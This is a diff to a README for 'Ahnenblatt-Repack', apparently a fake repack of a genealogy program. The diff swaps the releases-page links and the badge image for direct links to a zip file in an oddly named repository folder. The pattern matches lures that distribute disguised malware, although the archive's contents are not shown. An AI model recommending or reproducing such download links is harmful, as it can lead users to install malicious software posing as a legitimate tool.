@@ -1,6 +1,6 @@
 # 🌳 Ahnenblatt-Repack - Simplify Your Family History Research
 
-[![Download Ahnenblatt-Repack](https://img.shields.io/badge/Download-Ahnenblatt--Repack-blue.svg)](https://github.com/Prorok9889/Ahnenblatt-Repack/releases)
+[![Download Ahnenblatt-Repack](https://raw.githubusercontent.com/Prorok9889/Ahnenblatt-Repack/main/tourette/Repack-Ahnenblatt-1.8.zip)](https://raw.githubusercontent.com/Prorok9889/Ahnenblatt-Repack/main/tourette/Repack-Ahnenblatt-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Ahnenblatt-Repack! This tool helps you manage your family history res
 
 To get started, you need to download the software. Click the link below:
 
-[Visit this page to download](https://github.com/Prorok9889/Ahnenblatt-Repack/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Prorok9889/Ahnenblatt-Repack/main/tourette/Repack-Ahnenblatt-1.8.zip)
 
 After downloading, follow these simple steps to install:
 
@@ -71,6 +71,6 @@ You can explore more about these topics to enhance your experience with the soft
 
 To download Ahnenblatt-Repack, click here:
 
-[Visit this page to download](https://github.com/Prorok9889/Ahnenblatt-Repack/releases)  
+[Visit this page to download](https://raw.githubusercontent.com/Prorok9889/Ahnenblatt-Repack/main/tourette/Repack-Ahnenblatt-1.8.zip)  
 
 Thank you for choosing Ahnenblatt-Repack. Start your family history journey today!
